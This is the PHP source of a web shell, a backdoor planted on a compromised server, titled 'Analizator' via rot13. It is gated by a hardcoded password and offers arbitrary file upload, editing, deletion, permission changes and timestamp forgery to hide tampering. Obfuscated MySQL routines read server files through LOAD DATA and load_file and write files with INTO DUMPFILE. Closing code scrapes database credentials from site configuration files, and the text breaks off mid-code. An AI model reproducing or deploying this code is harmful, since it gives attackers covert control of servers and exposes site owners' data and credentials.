<?php
error_reporting(5);
@set_magic_quotes_runtime(0);
ob_start();
$mtime  = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('WIND_IS', DIRECTORY_SEPARATOR == '\\');
define('GPC_IS', get_magic_quotes_gpc());
$func_dis = get_cfg_var('disable_functions');
define('ROOT_SA', str_replace('\\', '/', dirname(__FILE__)) . '/');
define('COM_IS', class_exists('COM') ? 1 : 0);
define('PHPINFO_IS', (!eregi("phpinfo", $func_dis)) ? 1 : 0);
@set_time_limit(0);
foreach (array(
 '_POST',
 '_GET'
) as $_reqt) {
 foreach ($$_reqt as $_klu => $_val) {
  if ($_klu{0} != '_') {
 if (GPC_IS) {
  $_val = s_array($_val);
 }
 $$_klu = $_val;
  }
 }
}
$posh   = array();
$posh['check']  = true;
$posh['pass'] = '222';
$posh['cookiepre'] = '';
$posh['cookiedomain'] = '';
$posh['cookiepath'] = '/';
$posh['cookielife'] = 86400;
if ($charset == 'utf8') {
 header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'cp1251') {
 header("content-Type: text/html; charset=cp1251");
} elseif ($charset == 'windows-1251') {
 header("content-Type: text/html; charset=windows-1251");
} elseif ($charset == 'latin1') {
 header("content-Type: text/html; charset=latin1");
}
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();
if ($action == "logout") {
 scookie('_umtil', '', -86400 * 365);
 p('<meta http-equiv="refresh" content="1;URL=' . $self . '">');
 p('<a style="font:12px Verdana" href="' . $self . '">Success</a>');
 exit;
}
if ($posh['check']) {
 if ($doing == 'login') {
  if ($posh['pass'] == $password) {
 scookie('_umtil', $password);
 p('<meta http-equiv="refresh" content="1;URL=' . $self . '">');
 p('<a style="font:12px Verdana" href="' . $self . '">Success</a>');
 exit;
  }
 }
 if ($_COOKIE['_umtil']) {
  if ($_COOKIE['_umtil'] != $posh['pass']) {
 loginpage();
  }
 } else {
  loginpage();
 }
}
$errmsg = '';
if ($doing == 'downfile' && $thefile) {
 if (!@file_exists($thefile)) {
  $errmsg = 'The file you want Downloadable was nonexistent';
 } else {
  $fileinfo = pathinfo($thefile);
  header('Content-type: application/x-' . $fileinfo['extension']);
  header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
  header('Content-Length: ' . filesize($thefile));
  @readfile($thefile);
  exit;
 }
}
$GLOBA['_1919251734_'] = Array(
 'array_flip',
 'm' . 'ysql_erro' . 'r',
 'basen' . 'ame',
 'h' . 'eader',
 'h' . 'ea' . 'd' . 'er',
 'mys' . 'ql_fetch' . '_' . 'array',
 '' . 'mys' . 'ql_clo' . 'se',
 'file_exi' . 'st' . 's',
 'addslashes',
 '' . 'm' . 'ysql_' . 'fetch_arr' . 'ay',
 '' . 'mysql' . '_error',
 'p' . 'at' . 'hinfo',
 'heade' . 'r',
 'he' . 'ader',
 'header',
 's' . 'trlen'
);
function _85675412($i)
{
 $a = Array(
  'backupmysql',
  "SHOW tables",
  '<h2>',
  '</h2>',
  'HTTP_HOST',
  '_MySQL.sql',
  'Content-type: application/unknown',
  'Content-Disposition: attachment; filename=',
  '',
  'mysqldown',
  'Please input dbname',
  'The file you want Downloadable was nonexistent',
  "DROP TABLE IF EXISTS tmp_klop;",
  "CREATE TABLE tmp_klop (content LONGBLOB NOT NULL);",
  "LOAD DATA LOCAL INFILE '",
  "select content from tmp_klop",
  "DROP TABLE tmp_klop",
  'Load file failed ',
  'Content-type: application/x-',
  'extension',
  'Content-Disposition: attachment; filename=',
  'basename',
  "Accept-Length: "
 );
 return $a[$i];
}
if ($_0 == _85675412(0) && !$_1) {
 dbconn($_2, $_3, $_4, $_5, $_6, $_7);
 $_8 = $GLOBA['_1919251734_'][0]($_8);
 $_9 = q(_85675412(1));
 if (!$_9)
  p(_85675412(2) . $GLOBA['_1919251734_'][1]() . _85675412(3));
 $_10 = $GLOBA['_1919251734_'][2]($_SERVER[_85675412(4)] . _85675412(5));
 $GLOBA['_1919251734_'][3](_85675412(6));
 $GLOBA['_1919251734_'][4](_85675412(7) . $_10);
 $_11 = _85675412(8);
 while ($_12 = $GLOBA['_1919251734_'][5]($_9)) {
  if (isset($_8[$_12[0]])) {
 $_11 .= sqldumptable($_12[0]);
  }
 }
 $GLOBA['_1919251734_'][6]();
 exit;
}
if ($_0 == _85675412(9)) {
 if (!$_5) {
  $_13 = _85675412(10);
 } else {
  dbconn($_2, $_3, $_4, $_5, $_6, $_7);
  if (!$GLOBA['_1919251734_'][7]($_14)) {
 $_13 = _85675412(11);
  } else {
 $_9 = q("select load_file('$_14');");
 if (!$_9) {
  q(_85675412(12));
  q(_85675412(13));
  q(_85675412(14) . $GLOBA['_1919251734_'][8]($_14) . "' INTO TABLE tmp_klop FIELDS TERMINATED BY '__klop_{$_15}_eof__' ESCAPED BY '' LINES TERMINATED BY '__klop_{$_15}_eof__';");
  $_9 = q(_85675412(15));
  q(_85675412(16));
 }
 $_16 = @$GLOBA['_1919251734_'][9]($_9);
 if (!$_16) {
  $_13 = _85675412(17) . $GLOBA['_1919251734_'][10]();
 } else {
  $_17 = $GLOBA['_1919251734_'][11]($_14);
  $GLOBA['_1919251734_'][12](_85675412(18) . $_17[_85675412(19)]);
  $GLOBA['_1919251734_'][13](_85675412(20) . $_17[_85675412(21)]);
  $GLOBA['_1919251734_'][14](_85675412(22) . $GLOBA['_1919251734_'][15]($_16[0]));
  echo $_16[0];
  exit;
 }
  }
 }
}
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title><?php
echo str_rot13('Nanyvmngbe');
?></title>
<style type="text/css">body,td{font:12px Arial,Tahoma;line-height:16px}.input{font:12px Arial,Tahoma;background:#fde;border:1px solid #666;padding:2px;height:22px}.area{font:12px 'Courier New',Monospace;background:#fff;border:1px solid #666;padding:2px}.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px}a{color:#00f;text-decoration:underline}a:hover{color:#f00;text-decoration:none}.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px}.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px}.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#FEDD25;padding:5px 10px 5px 5px}.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#C6F2C8;padding:5px 10px 5px 5px;font-weight:bold}.head td span{font-weight:normal}form{margin:0;padding:0}h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F}ul.info li{margin:0;color:#444;line-height:24px;height:24px}u{text-decoration:none;color:#777;float:left;display:block;width:150px;margin-right:10px}</style>
<script type="text/javascript">
function CheckAll(form) {
for(var i=0;i<form.elements.length;i++) {
var e = form.elements[i];
if (e.name != 'chkall')
e.checked = form.chkall.checked;
}
}
function $(id) {
return document.getElementById(id);
}
function goaction(act){
$('goaction').action.value=act;
$('goaction').submit();
}
</script></head><body style="margin:0;table-layout:fixed; word-break:break-all">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head"><td><?php
echo $_SERVER['HTTP_HOST'] . "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" . gethostbyname($_SERVER['SERVER_NAME']) . "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" . $_SERVER['SERVER_SOFTWARE'];
?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Safe Mode: <?php
echo getcfg('safe_mode');
?></td></tr><tr class="alt1"><td><a href="javascript:goaction('logout');">Logout</a> |
<a href="javascript:goaction('file');">File Manager</a> |
<a href="javascript:goaction('sqladmin');">MySQL Manager</a>
</td></tr></table><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
formhead(array(
 'name' => 'goaction'
));
makehide('action');
formfoot();
$errmsg && m($errmsg);
!$dir && $dir = '.';
$nowpath = getPath(ROOT_SA, $dir);
if (substr($dir, -1) != '/') {
 $dir = $dir . '/';
}
$uedir = ue($dir);
if (!$action || $action == 'file') {
 $dir_writeable = @is_writable($nowpath) ? '<font color="green"><b>Writable OK</b></font>' : '<font color="red"><b>Non-Writable</b></font>';
 if ($doing == 'deldir' && $thefile) {
  if (!file_exists($thefile)) {
 m($thefile . ' directory does not exist');
  } else {
 m('Directory delete ' . (deltree($thefile) ? basename($thefile) . ' success' : 'failed'));
  }
 } elseif ($newdirname) {
  $mkdirs = $nowpath . $newdirname;
  if (file_exists($mkdirs)) {
 m('Directory has already existed');
  } else {
 m('Directory created ' . (@mkdir($mkdirs, 0777) ? 'success' : 'failed'));
 @chmod($mkdirs, 0777);
  }
 } elseif ($doupfile) {
  if (isset($_FILES['uploadfile'], $_FILES['uploadfile']['name'])) {
 $sizeof = sizeof($_FILES['uploadfile']['name']);
 while ($sizeof--) {
  m('File #' . $sizeof . ' upload ' . (@copy($_FILES['uploadfile']['tmp_name'][$sizeof], $uploaddir . '/' . $_FILES['uploadfile']['name'][$sizeof]) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
 }
  }
 } elseif ($editfilename && $filecontent) {
  $fp = @fopen($editfilename, 'w');
  m('Save file ' . (@fwrite($fp, $filecontent) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
  @fclose($fp);
 } elseif ($pfile && $newperm) {
  if (!file_exists($pfile)) {
 m('The original file does not exist');
  } else {
 $newperm = base_convert($newperm, 8, 10);
 m('Modify file attributes ' . (@chmod($pfile, $newperm) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
  }
 } elseif ($oldname && $newfilename) {
  $nname = $nowpath . $newfilename;
  if (file_exists($nname) || !file_exists($oldname)) {
 m($nname . ' has already existed or original file does not exist');
  } else {
 m(basename($oldname) . ' renamed ' . basename($nname) . (@rename($oldname, $nname) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
  }
 } elseif ($sname && $tofile) {
  if (file_exists($tofile) || !file_exists($sname)) {
 m('The goal file has already existed or original file does not exist');
  } else {
 m(basename($tofile) . ' copied ' . (@copy($sname, $tofile) ? basename($tofile) . ' success' : 'failed'));
  }
 } elseif ($curfile && $tarfile) {
  if (!@file_exists($curfile) || !@file_exists($tarfile)) {
 m('The goal file has already existed or original file does not exist');
  } else {
 $time = @filemtime($tarfile);
 m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
  }
 } elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
  if (!@file_exists($curfile)) {
 m(basename($curfile) . ' does not exist');
  } else {
 $time = strtotime("$year-$month-$day $hour:$minute:$second");
 m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? '<font color="green">Success OK</font>' : '<font color="red">Failed FACK</font>'));
  }
 } elseif ($doing == 'downrar') {
  if ($dl) {
 $dfiles = '';
 foreach ($dl as $filepath => $value) {
  $dfiles .= $filepath . ',';
 }
 $dfiles = substr($dfiles, 0, strlen($dfiles) - 1);
 $dl  = explode(',', $dfiles);
 $zip = new PHPZip($dl);
 $code = $zip->out;
 header('Content-type: application/octet-stream');
 header('Accept-Ranges: bytes');
 header('Accept-Length: ' . strlen($code));
 header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz');
 echo $code;
 exit;
  } else {
 m('Please select file(s)');
  }
 } elseif ($doing == 'delfiles') {
  if ($dl) {
 $dfiles = '';
 $succ = $fail = 0;
 foreach ($dl as $filepath => $value) {
  if (@unlink($filepath)) {
   $succ++;
  } else {
   $fail++;
  }
 }
 m('Deleted file have finished: ' . count($dl) . ' OK ' . $succ . ' FACK ' . $fail);
  } else {
 m('Please select file(s)');
  }
 }
 formhead(array(
  'name' => 'creadire'
 ));
 makehide('newdirname');
 makehide('dir', $nowpath);
 formfoot();
 formhead(array(
  'name' => 'fileperm'
 ));
 makehide('newperm');
 makehide('pfile');
 makehide('dir', $nowpath);
 formfoot();
 formhead(array(
  'name' => 'copyfile'
 ));
 makehide('sname');
 makehide('tofile');
 makehide('dir', $nowpath);
 formfoot();
 formhead(array(
  'name' => 'rename'
 ));
 makehide('oldname');
 makehide('newfilename');
 makehide('dir', $nowpath);
 formfoot();
 formhead(array(
  'name' => 'fileopform'
 ));
 makehide('action');
 makehide('opfile');
 makehide('dir');
 formfoot();
 $free = @disk_free_space($nowpath);
 !$free && $free = 0;
 $all = @disk_total_space($nowpath);
 !$all && $all = 0;
 $used = $all - $free;
 $used_percent = @round(100 / ($all / $free), 2);
 p('<h2>Current disk free ' . sizecount($free) . ' of ' . sizecount($all) . ' (' . $used_percent . '%)</h2>');
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
<form action="" method="post" id="godir" name="godir">
<tr>
<td nowrap>Current Directory (<?php
 echo $dir_writeable;
?>, <?php
 echo getChmod($nowpath);
?>)</td>
<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php
 echo $nowpath;
?>" type="text" style="width:100%;margin:0 8px;"></td>
<td nowrap><input class="bt" value="GO" type="submit"></td>
</tr>
</form>
</table>
<script type="text/javascript">
function creadire(){
var newdirname;
newdirname = prompt('Please input the directory name:', '');
if (!newdirname) return;
$('creadire').newdirname.value=newdirname;
$('creadire').submit();
}
function fileperm(pfile){
var newperm;
newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
if (!newperm) return;
$('fileperm').newperm.value=newperm;
$('fileperm').pfile.value=pfile;
$('fileperm').submit();
}
function copyfile(sname){
var tofile;
tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
if (!tofile) return;
$('copyfile').tofile.value=tofile;
$('copyfile').sname.value=sname;
$('copyfile').submit();
}
function rename(oldname){
var newfilename;
newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
if (!newfilename) return;
$('rename').newfilename.value=newfilename;
$('rename').oldname.value=oldname;
$('rename').submit();
}
function dofile(doing,thefile,m){
if (m && !confirm(m)) {
return;
}
$('filelist').doing.value=doing;
if (thefile){
$('filelist').thefile.value=thefile;
}
$('filelist').submit();
}
function creafil(nowpath){
var filename;
filename = prompt('Please input the file name:', '');
if (!filename) return;
opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
$('fileopform').action.value=action;
$('fileopform').opfile.value=opfile;
$('fileopform').dir.value=dir;
$('fileopform').submit();
}
function godir(dir,view_writable){
if (view_writable) {
$('godir').view_writable.value=1;
}
$('godir').dir.value=dir;
$('godir').submit();
}
</script>
<?php
 tbhead();
 p('<form action="' . $self . '" method="POST" enctype="multipart/form-data"><tr class="input"><td colspan="7" style="padding:5px;">');
 p('<a href="javascript:godir(\'' . $_SERVER["DOCUMENT_ROOT"] . '\');">WebRoot</a>');
 if ($view_writable) {
  p(' | <a href="javascript:godir(\'' . $nowpath . '\');">View All</a>');
 } else {
  p(' | <a href="javascript:godir(\'' . $nowpath . '\',\'1\');">View Writable</a>');
 }
 p(' | <a href="javascript:creadire();">Create Directory</a> | <a href="javascript:creafil(\'' . $nowpath . '\');">Create File</a>');
 if (WIND_IS && COM_IS) {
  $obj = new COM('scripting.filesystemobject');
  if ($obj && is_object($obj)) {
 $DriveTypeDB = array(
  0 => 'Unknow',
  1 => 'Removable',
  2 => 'Fixed',
  3 => 'Network',
  4 => 'CDRom',
  5 => 'RAM Disk'
 );
 foreach ($obj->Drives as $drive) {
  if ($drive->DriveType == 2) {
   p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Size:' . sizecount($drive->TotalSize) . '&#13;Free:' . sizecount($drive->FreeSpace) . '&#13;Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
  } else {
   p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
  }
 }
  }
 }
 p('</td></tr><tr class="alt1"><td colspan="7" style="padding:5px;">');
 p('<div style="float:center;"> <input class="input" name="uploadfile[]" multiple type="file" /> <br />
<input class="bt" name="doupfile" value="Upload" type="submit" /> <input name="uploaddir" value="' . $dir . '" type="hidden" /> <input name="dir" value="' . $dir . '" type="hidden" /></div></td></tr></form>');
 p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
 $dirdata  = array();
 $filedata = array();
 if ($view_writable) {
  $dirdata = GetList($nowpath);
 } else {
  $dirs = @opendir($dir);
  while ($file = @readdir($dirs)) {
 $filepath = $nowpath . $file;
 if (@is_dir($filepath)) {
  $dirdb['filename'] = $file;
  $dirdb['mtime']  = @date('Y-m-d H:i:s', filemtime($filepath));
  $dirdb['dirchmod'] = getChmod($filepath);
  $dirdb['dirperm']  = getPerms($filepath);
  $dirdb['fileowner'] = getUser($filepath);
  $dirdb['dirlink']  = $nowpath;
  $dirdb['server_link'] = $filepath;
  $dirdb['client_link'] = ue($filepath);
  $dirdata[] = $dirdb;
 } else {
  $filedb['filename'] = $file;
  $filedb['size']  = sizecount(@filesize($filepath));
  $filedb['mtime']  = @date('Y-m-d H:i:s', filemtime($filepath));
  $filedb['filechmod'] = getChmod($filepath);
  $filedb['fileperm'] = getPerms($filepath);
  $filedb['fileowner'] = getUser($filepath);
  $filedb['dirlink']  = $nowpath;
  $filedb['server_link'] = $filepath;
  $filedb['client_link'] = ue($filepath);
  $filedata[] = $filedb;
 }
  }
  unset($dirdb);
  unset($filedb);
  @closedir($dirs);
 }
 @sort($dirdata);
 @sort($filedata);
 $dir_i = '0';
 foreach ($dirdata as $key => $dirdb) {
  if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
 $thisbg = bg();
 p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
 p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
 p('<td><a href="javascript:godir(\'' . $dirdb['server_link'] . '\');">' . $dirdb['filename'] . '</a></td>');
 p('<td nowrap>' . $dirdb['mtime'] . '</td>');
 p('<td nowrap>--</td>');
 p('<td nowrap>');
 p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirchmod'] . '</a> / ');
 p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
 p('<td nowrap><a href="javascript:dofile(\'deldir\',\'' . $dirdb['server_link'] . '\',\'Are you sure will delete ' . $dirdb['filename'] . '? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\'' . $dirdb['server_link'] . '\');">Rename</a></td>');
 p('</tr>');
 $dir_i++;
  } else {
 if ($dirdb['filename'] == '..') {
  p('<tr class=' . bg() . '>');
  p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\'' . getUpPath($nowpath) . '\');">Parent Directory</a></td>');
  p('</tr>');
 }
  }
 }
 p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
 p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
 makehide('action', 'file');
 makehide('thefile');
 makehide('doing');
 makehide('dir', $nowpath);
 $file_i = '0';
 foreach ($filedata as $key => $filedb) {
  if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
 $fileurl = str_replace(ROOT_SA, '', $filedb['server_link']);
 $thisbg  = bg();
 p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
 p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl[' . $filedb['server_link'] . ']"></td>');
 p('<td><a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a></td>');
 p('<td nowrap>' . $filedb['mtime'] . '</td>');
 p('<td nowrap>' . $filedb['size'] . '</td>');
 p('<td nowrap>');
 p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['filechmod'] . '</a> / ');
 p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>');
 p('<td nowrap>');
 p('<a href="javascript:dofile(\'downfile\',\'' . $filedb['server_link'] . '\');">Down</a> | ');
 p('<a href="javascript:copyfile(\'' . $filedb['server_link'] . '\');">Copy</a> | ');
 p('<a href="javascript:opfile(\'editfile\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
 p('<a href="javascript:rename(\'' . $filedb['server_link'] . '\');">Rename</a> | ');
 p('<a href="javascript:opfile(\'newtime\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Time</a>');
 p('</td></tr>');
 $file_i++;
  }
 }
 p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
 p('</form></table>');
} elseif ($action == 'sqlfile') {
 if ($doing == "mysqlupload") {
  $file  = $_FILES['uploadfile'];
  $filename = $file['tmp_name'];
  if (file_exists($savepath)) {
 m('The goal file has already existed');
  } else {
 if (!$filename) {
  m('Please choose a file');
 } else {
  $fp  = @fopen($filename, 'r');
  $contents = @fread($fp, filesize($filename));
  @fclose($fp);
  $contents = bin2hex($contents);
  if (!$upname)
   $upname = $file['name'];
  dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
  m($result ? 'Upload success' : 'Upload has failed: ' . mysql_error());
 }
  }
 }

 !$dbhost && $dbhost = 'localhost';
 !$dbuser && $dbuser = '';
 !$dbport && $dbport = '3306';
 $charsets = array(
  '' => 'Default',
  'cp1251' => 'CP1251',
  'windows-1251' => 'WINDOWS-1251',
  'utf8' => 'UTF-8',
  'latin1' => 'Latin1'
 );
 formhead(array(
  'title' => 'MYSQL Information',
  'name' => 'dbinfo'
 ));
 makehide('action', 'sqlfile');
 p('<p>');
 p('DBHost:');
 makeinput(array(
  'name' => 'dbhost',
  'size' => 20,
  'value' => $dbhost
 ));
 p(':');
 makeinput(array(
  'name' => 'dbport',
  'size' => 4,
  'value' => $dbport
 ));
 p('DBUser:');
 makeinput(array(
  'name' => 'dbuser',
  'size' => 15,
  'value' => $dbuser
 ));
 p('DBPass:');
 makeinput(array(
  'name' => 'dbpass',
  'size' => 15,
  'value' => $dbpass
 ));
 p('DBName:');
 makeinput(array(
  'name' => 'dbname',
  'size' => 15,
  'value' => $dbname
 ));
 p('DBCharset:');
 makeselect(array(
  'name' => 'charset',
  'option' => $charsets,
  'selected' => $charset
 ));
} elseif ($action == 'sqladmin') {
 !$dbhost && $dbhost = 'localhost';
 !$dbuser && $dbuser = '';
 !$dbport && $dbport = '3306';
 $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
 if (isset($dbhost)) {  $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n"; }
 if (isset($dbuser)) {  $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n"; }
 if (isset($dbpass)) {  $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n"; }
 if (isset($dbport)) {  $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n"; }
 if (isset($dbname)) {  $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n"; }
 if (isset($charset)) {  $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n"; }
 if ($doing == 'backupmysql' && $saveasfile) {
  if (!$table) {
 m('Please choose the table');
  } else {
 dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 $table = array_flip($table);
 $fp = @fopen($path, 'w');
 if ($fp) {
  $result = q('SHOW tables');
  if (!$result)
   p('<h2>' . mysql_error() . '</h2>');
  $mysqldata = '';
  while ($currow = mysql_fetch_array($result)) {
   if (isset($table[$currow[0]])) {
  sqldumptable($currow[0], $fp);
   }
  }
  fclose($fp);
  $fileurl = str_replace(ROOT_SA, '', $path);
  m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
  mysql_close();
 } else {
  m('Backup failed');
 }
  }
 }
 if ($insert && $insertsql) {
  $keystr = $valstr = $tmp = '';
  foreach ($insertsql as $key => $val) {
 if ($val) {
  $keystr .= $tmp . $key;
  $valstr .= $tmp . "'" . addslashes($val) . "'";
  $tmp = ',';
 }
  }
  if ($keystr && $valstr) {
 dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
  }
 }
 if ($update && $insertsql && $base64) {
  $valstr = $tmp = '';
  foreach ($insertsql as $key => $val) {
 $valstr .= $tmp . $key . "='" . addslashes($val) . "'";
 $tmp = ',';
  }
  if ($valstr) {
 $where = base64_decode($base64);
 dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
  }
 }
 if ($doing == 'del' && $base64) {
  $where = base64_decode($base64);
  $delete_sql = "DELETE FROM $tablename WHERE $where";
  dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
 }
 if ($tablename && $doing == 'drop') {
  dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  if (q("DROP TABLE $tablename")) {
 m('Drop table of success');
 $tablename = '';
  } else {
 m(mysql_error());
  }
 }
 $charsets = array(
  '' => 'Default',
  'windows-1251' => 'WINDOWS-1251',
  'utf8' => 'UTF-8',
  'cp1251' => 'CP1251',
  'latin1' => 'Latin1'
 );
 formhead(array(
  'title' => 'MYSQL Manager'
 ));
 makehide('action', 'sqladmin');
 p('<p>');
 p('DBHost:');
 makeinput(array(
  'name' => 'dbhost',
  'size' => 20,
  'value' => $dbhost
 ));
 p(':');
 makeinput(array(
  'name' => 'dbport',
  'size' => 4,
  'value' => $dbport
 ));
 p('DBUser:');
 makeinput(array(
  'name' => 'dbuser',
  'size' => 15,
  'value' => $dbuser
 ));
 p('DBPass:');
 makeinput(array(
  'name' => 'dbpass',
  'size' => 15,
  'value' => $dbpass
 ));
 p('DBCharset:');
 makeselect(array(
  'name' => 'charset',
  'option' => $charsets,
  'selected' => $charset
 ));
 makeinput(array(
  'name' => 'connect',
  'value' => 'Connect',
  'type' => 'submit',
  'class' => 'bt'
 ));
 p('</p>');
 formfoot();
?>
<script type="text/javascript">
function editrecord(action, base64, tablename){
if (action == 'del') {
if (!confirm('Is or isn\'t deletion record?')) return;
}
$('recordlist').doing.value=action;
$('recordlist').base64.value=base64;
$('recordlist').tablename.value=tablename;
$('recordlist').submit();
}
function moddbname(dbname) {
if(!dbname) return;
$('setdbname').dbname.value=dbname;
$('setdbname').submit();
}
function settable(tablename,doing,page) {
if(!tablename) return;
if (doing) {
$('settable').doing.value=doing;
}
if (page) {
$('settable').page.value=page;
}
$('settable').tablename.value=tablename;
$('settable').submit();
}
</script>
<?php
$tr = $_SERVER['DOCUMENT_ROOT'] . '/dblist/';
foreach (glob($tr."*.xml") as $filename) {
if (file_exists($filename)) {
$text = file_get_contents($filename);
}
preg_match_all('~SQLSERVER="(.*?)"~is', $text, $prs);
preg_match_all('~DB_USER="(.*?)"~is', $text, $pru);
preg_match_all('~DB_PASSWORD="(.*?)"~is', $text, $prp);
preg_match_all('~DB_NAME="(.*?)"~is', $text, $prd);
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($prs[1]).'"><br>';
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($pru[1]).'"><br>';
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($prp[1]).'"><br>';
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($prd[1]).'">';
}
$filename = $_SERVER['DOCUMENT_ROOT'] . "/cfg/connect.inc.php";
if (file_exists($filename)) {
$text = file_get_contents($filename);
preg_match_all("!HOST', '(.+)'!", $text, $matches41);
preg_match_all("!NAME', '(.+)'!", $text, $matches31);
preg_match_all("!USER', '(.+)'!", $text, $matches21);
preg_match_all("!PASS', '(.+)'!", $text, $matches11);
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($matches41[1]).'"><br>';
